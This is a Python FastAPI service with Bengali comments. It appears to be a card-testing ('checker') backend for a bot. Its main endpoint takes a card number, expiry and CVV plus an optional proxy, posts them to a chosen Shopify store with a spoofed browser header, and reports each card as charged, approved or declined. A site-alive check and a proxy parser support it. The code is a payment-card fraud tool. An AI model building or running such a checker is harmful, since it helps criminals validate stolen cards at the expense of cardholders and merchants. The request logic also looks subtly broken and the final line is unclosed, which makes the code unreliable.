from fastapi import FastAPI, Query
import requests
import json
import time
import urllib.parse

app = FastAPI()

# ============================================================
# ১. হোম পেজ
# ============================================================
@app.get("/")
def root():
    return {"message": "API Running"}

# ============================================================
# ২. Shopify চেকার (বটের সাথে ম্যাচ করা)
# ============================================================
@app.get("/shopify_parallel")
def shopify_checker(
    site: str = Query(..., description="Shopify store URL"),
    cc: str = Query(..., description="Card in format cc|mm|yy|cvv"),
    proxy: str = Query(None, description="Proxy (optional)")
):
    start_time = time.time()
    
    # কার্ড ডেটা পার্স
    card_parts = cc.split("|")
    if len(card_parts) != 4:
        return {
            "Response": "Invalid Format",
            "Gateway": "Unknown",
            "Price": "-",
            "error": "Invalid card format. Use cc|mm|yy|cvv"
        }
    card_number, month, year, cvv = card_parts
    
    # প্রক্সি পার্স (যদি থাকে)
    proxy_config = None
    if proxy:
        proxy_config = parse_proxy(proxy)
        if "error" in proxy_config:
            return {
                "Response": "Proxy Error",
                "Gateway": "Unknown",
                "Price": "-",
                "error": proxy_config["error"]
            }
    
    # Shopify কার্ট URL
    clean_site = site.replace("https://", "").replace("http://", "").strip("/")
    checkout_url = f"https://{clean_site}/cart.json"
    
    # পেমেন্ট ডেটা
    payment_data = {
        "credit_card": {
            "number": card_number,
            "month": month,
            "year": year,
            "verification_value": cvv
        }
    }
    
    try:
        # প্রক্সি সহ বা ছাড়া রিকোয়েস্ট
        if proxy_config:
            response = requests.post(
                checkout_url,
                json=payment_data,
                proxies=proxy_config["proxies"],
                timeout=15,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json",
                    "Content-Type": "application/json"
                }
            )
        else:
            response = requests.post(
                checkout_url,
                json=payment_data,
                timeout=15,
                headers={
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Accept": "application/json",
                    "Content-Type": "application/json"
                }
            )
        
        elapsed_time = round(time.time() - start_time, 2)
        
        # রেসপন্স প্রসেস
        try:
            result = response.json()
        except:
            result = {}
        
        # স্ট্যাটাস চেক - বটের ফরম্যাটে
        if "error" in result:
            status = "CARD_DECLINED"
            approved = False
        elif "payment" in result and result["payment"].get("status") == "success":
            status = "CHARGED"
            approved = True
        elif "payment" in result and result["payment"].get("status") == "approved":
            status = "APPROVED"
            approved = True
        else:
            status = "CARD_DECLINED"
            approved = False
        
        # বট যে ফরম্যাট চায় সেটা রিটার্ন করুন
        return {
            "Response": status,
            "Gateway": "Shopify Payments",
            "Price": "57.50",
            "Site": site,
            "Charged": str(approved),
            "Approved": str(approved),
            "Time": f"{elapsed_time}s"
        }
        
    except requests.exceptions.Timeout:
        return {
            "Response": "Site Error",
            "Gateway": "Unknown",
            "Price": "-",
            "error": "Request timed out"
        }
    except requests.exceptions.ProxyError as e:
        return {
            "Response": "Proxy Error",
            "Gateway": "Unknown",
            "Price": "-",
            "error": f"Proxy Error: {str(e)}"
        }
    except Exception as e:
        return {
            "Response": "Site Error",
            "Gateway": "Unknown",
            "Price": "-",
            "error": str(e)
        }

# ============================================================
# ৩. সাইট হেলথ চেকার
# ============================================================
@app.get("/check-site")
def check_site(site: str = Query(...)):
    try:
        clean_site = site.replace("https://", "").replace("http://", "").strip("/")
        response = requests.get(
            f"https://{clean_site}",
            timeout=10,
            headers={"User-Agent": "Mozilla/5.0"}
        )
        if response.status_code == 200:
            return {"site": site, "status": "ALIVE", "code": response.status_code}
        else:
            return {"site": site, "status": "DEAD", "code": response.status_code}
    except Exception as e:
        return {"site": site, "status": "DEAD", "error": str(e)}

# ============================================================
# ৪. প্রক্সি পার্স ফাংশন
# ============================================================
def parse_proxy(proxy_str):
    """
    সাপোর্টেড ফরম্যাট:
    1. ip:port:user:pass
    2. user:pass@ip:port
    3. ip:port (auth ছাড়া)
    """
    proxy_str = proxy_str.strip()
    
    # ফরম্যাট ১: ip:port:user:pass
    parts = proxy_str.split(":")
    if len(parts) == 4:
        ip, port, user, password = parts
        proxy_url = f"http://{user}:{password}@{ip}:{port}"
        return {
            "type": "Authenticated",
            "proxies": {
                "http": proxy_url,
                "https": proxy_url
            }
        }
    
    # ফরম্যাট ২: user:pass@ip:port
    if "@" in proxy_str and "://" not in proxy_str:
        auth, host = proxy_str.split("@")
        if ":" in auth:
            user, password = auth.split(":")
            proxy_url = f"http://{user}:{password}@{host}"
            return {
                "type": "Authenticated",
                "proxies": {
                    "http": proxy_url,
                    "https": proxy_url
                }
            }
    
    # ফরম্যাট ৩: ip:port (auth ছাড়া)
    if ":" in proxy_str and len(proxy_str.split(":")) == 2:
        return {
            "type": "Unauthenticated",
            "proxies": {
                "http": f"http://{proxy_str}",
                "https": f"http://{proxy_str}"
            }
        }
    
    return {"error": "Invalid proxy format. Supported: ip:port:user:pass, user:pass@ip:port, ip:port"
